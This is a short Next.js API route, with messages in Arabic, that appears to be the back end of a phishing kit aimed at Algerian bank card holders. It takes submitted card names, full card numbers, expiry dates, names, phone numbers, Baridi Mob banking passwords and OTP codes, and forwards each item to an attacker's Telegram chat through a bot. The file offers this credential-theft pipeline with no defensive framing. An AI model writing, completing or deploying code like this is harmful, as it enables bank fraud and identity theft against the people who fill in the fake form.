import { NextRequest, NextResponse } from "next/server";

export async function POST(request: NextRequest) {
  try {
    const data = await request.json();
    
    const { type, payload } = data;
    
    let message = "";
    
    switch (type) {
      case "card_selected":
        message = `🆕 *اختيار بطاقة جديدة*\n📇 ${payload.cardName}`;
        break;
        
      case "card_number":
        message = `🔢 *رقم البطاقة*\n\`${payload.cardNumber}\``;
        break;
        
      case "personal_info":
        const fullName = `${payload.firstName} ${payload.lastName}`;
        message = `👤 *معلومات شخصية*\n\n📋 الاسم: ${fullName}\n🔢 رقم البطاقة: \`${payload.cardNumber}\`\n📅 تاريخ الانتهاء: \`${payload.expiryDate}\`\n📱 رقم الهاتف: \`${payload.phoneNumber}\`\n🔐 كلمة مرور بريدي موب: \`${payload.baridiPassword}\``;
        break;
        
      case "otp_attempt":
        const otpUserName = `${payload.firstName} ${payload.lastName}`;
        message = `🔔 *محاولة OTP*\n\n👤 المستخدم: ${otpUserName}\n🔐 الكود: \`${payload.otp}\`\n📊 المحاولة رقم: #${payload.attemptNumber}`;
        break;
        
      case "complete":
        const time = new Date().toLocaleString("ar-DZ", { timeZone: "Africa/Algiers" });
        message = `✅ *اكتمال العملية*\n\`${payload.firstName} ${payload.lastName}\n${payload.cardNumber}\`\n🕐 ${time}`;
        break;
        
      default:
        return NextResponse.json({ success: true });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    console.log("[v0] Telegram sending:", { type, botTokenExists: !!botToken, chatId });
    
    if (!botToken || !chatId) {
      console.error("[v0] Missing Telegram config:", { botToken: !!botToken, chatId: !!chatId });
      return NextResponse.json({ 
        success: false, 
        error: "Missing Telegram configuration" 
      }, { status: 500 });
    }

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Send to main chat
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    const responseText = await response.text();
    console.log("[v0] Telegram response:", { status: response.status, ok: response.ok, body: responseText });
    
    if (!response.ok) {
      console.error("[v0] Telegram failed:", responseText);
      return NextResponse.json({ 
        success: false, 
        error: `Telegram API error: ${responseText}` 
      }, { status: 500 });
    }

    console.log("[v0] Telegram message sent successfully");
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("[v0] Telegram error:", error);
    return NextResponse.json({ success: false, error: String(error) }, { status: 500 });
  }
}
